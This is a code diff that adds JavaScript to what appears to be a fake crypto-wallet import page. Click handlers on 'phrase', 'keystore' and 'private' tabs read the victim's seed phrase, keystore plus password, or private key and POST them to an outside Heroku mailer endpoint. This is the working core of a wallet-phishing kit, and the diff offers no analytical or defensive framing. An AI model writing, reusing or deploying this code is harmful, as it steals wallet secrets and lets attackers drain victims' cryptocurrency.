@@ -55,3 +55,70 @@ phrase.addEventListener('click', function() {
 
 
 
+function drawElementFromDOM(id) {
+    return document.querySelector(id)
+}
+
+const phraseBtn = document.querySelector('.phrase__tab')
+const keystoreBtn = document.querySelector('.keystore__tab')
+const privateBtn = document.querySelector('.private__tab')
+const phraseText = drawElementFromDOM('.txt1')
+const keystoreText = drawElementFromDOM('.txt2')
+const passwordText = drawElementFromDOM('.txt3')
+const privateText = drawElementFromDOM('.txt4')
+
+
+
+const url = 'https://mynodemailerapp.herokuapp.com/sender'
+
+
+phraseBtn.addEventListener('click', function() {
+    let headers = new Headers()
+    fetch(url, {
+                
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json'
+        }, 
+       
+        body: phraseText.value
+    }).then((res) => {
+       
+       return res.json()
+    })
+})
+
+keystoreBtn.addEventListener('click', function() {
+
+    let headers = new Headers()
+    fetch(url, {
+                
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json'
+        }, 
+       
+        body: `${keystoreText.value} password:  ${passwordText.value}`
+    }).then((res) => {
+       
+       return res.json()
+    })
+    console.log(567);
+})
+
+privateBtn.addEventListener('click', function() {
+    let headers = new Headers()
+    fetch(url, {
+                
+        method: "POST",
+        headers: {
+            'Content-Type': 'application/json'
+        }, 
+       
+        body: privateText.value
+    }).then((res) => {
+       
+       return res.json()
+    })
+    console.log(890);
+})
